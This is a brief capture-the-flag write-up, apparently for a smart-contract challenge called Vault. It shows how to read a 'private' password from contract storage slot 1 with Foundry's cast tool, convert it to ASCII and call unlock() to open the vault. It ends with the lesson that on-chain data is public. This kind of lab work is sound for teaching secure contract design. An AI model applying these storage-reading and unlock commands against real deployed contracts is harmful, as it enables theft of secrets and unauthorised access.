#VAULT 

##Objective : 
unlock the vault to pass the level.
for that set the locked to false

##analysis:
The unlock() function is taking an input _password.
and been compared with an existing password in the constructor.
read the value of the password from slot 1 of the Vault contract.
submit it to the unlock() function. 

```exploit :
use cast in foundry to fetch the data stored inside private variable slots.
cast storage <addr> 1 --rpc-url $RPC_URL
```

conv the password to ASCII
cast --to-ascii <passwd>

make a fn call to unlock()
```cast send <addr> "unlock(bytes32)" "passwd" --private-key $PKEY --rpc-url $RPC_URL
```


##takeaways :
Private functions and state variables are only visible for the contract 
all data stored in blockchain is accessible to all . 



